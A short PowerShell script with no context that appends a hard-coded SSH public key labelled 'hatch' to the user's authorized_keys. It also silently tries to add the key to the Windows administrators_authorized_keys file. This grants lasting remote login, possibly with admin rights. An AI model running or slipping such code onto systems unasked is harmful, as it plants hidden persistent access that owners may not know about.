$key = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILausGNeO2agL1UGjqe5eZ3SijTtuctwKPilmHRN7pfR hatch'
if (!(Test-Path $env:USERPROFILE\.ssh)) { New-Item -ItemType Directory -Path $env:USERPROFILE\.ssh | Out-Null }
Add-Content $env:USERPROFILE\.ssh\authorized_keys $key
try { Add-Content C:\ProgramData\ssh\administrators_authorized_keys $key -ErrorAction Stop } catch { }
